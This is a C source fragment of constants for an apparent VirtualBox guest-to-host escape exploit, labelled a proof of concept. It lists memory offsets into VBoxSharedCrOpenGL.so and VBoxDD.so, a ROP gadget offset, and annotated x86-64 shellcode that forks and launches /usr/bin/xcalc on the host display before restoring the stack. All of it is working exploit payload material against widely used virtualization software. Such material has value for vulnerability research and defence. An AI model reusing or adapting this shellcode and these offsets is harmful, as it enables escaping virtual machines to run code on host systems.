#include <ntddk.h>

/******************************************************************************
* Exploit's contants - if something not works, consider to review them
******************************************************************************/

/* Removed for the sake of PoC */
ULONGLONG OffsetFromOglToLeakedAddr = 0xF0418;			// VBoxSharedCrOpenGL.so
ULONGLONG OffsetFromVboxddToLeakedAddr = 0xA0A48;		// VBoxDD.so
ULONGLONG OffsetFromOglToVramPtr = 0x316670;			// g_pvVRamBase
ULONGLONG OffsetFromVboxddToRopGadget = 0xA4910;		// 0xA4985, 0xA4910

UCHAR gShellcode[] =
"\x48\xC7\xC0\x3A\x00\x00\x00"          // mov          rax, 00000003A
"\x0F\x05"								// syscall
"\x48\x85\xC0"							// test         rax, rax
"\x75\x3A"								// jnz          000000048
"\x48\x8D\x35\x4E\x00\x00\x00"          // lea          rsi, [000000063]
"\x48\x89\x35\x6B\x00\x00\x00"          // mov			[000000087], rsi
"\x48\x8D\x35\x57\x00\x00\x00"          // lea          rsi, [00000007A]
"\x48\x89\x35\x6D\x00\x00\x00"          // mov			[000000097], rsi
"\x48\x8D\x3D\x32\x00\x00\x00"          // lea          rdi, [000000063]
"\x48\x8D\x35\x4F\x00\x00\x00"          // lea          rsi, [000000087]
"\x48\x8D\x15\x58\x00\x00\x00"          // lea          rdx, [000000097]
"\x48\xC7\xC0\x3B\x00\x00\x00"          // mov          rax, 00000003B
"\x0F\x05"								// syscall
"\x48\x8B\xBC\x24\xB8\x01\x00\x00"      // mov          rdi, [rsp][0000002D8]
"\x48\x81\xC5\x80\x03\x00\x00"          // add          rbp, 0000002D0
"\x48\x81\xC4\xC0\x01\x00\x00"          // add          rsp, 0000002E0
"\x48\x31\xC0"							// xor          rax, rax
"\x57"									// push         rdi
"\xC3"									// retn
//"\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x78\x74\x65\x72\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// "/usr/bin/xterm"
"\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x78\x63\x61\x6c\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// "/usr/bin/xcalc"
"\x44\x49\x53\x50\x4C\x41\x59\x3D\x3A\x30\x2E\x30\x00"											// "DISPLAY=:0.0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"								// argv[]
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";								// envp[]

SIZE_T gShellcodeSize = sizeof(gShellcode);

/******************************************************************************
* End of exploit's contants
******************************************************************************/
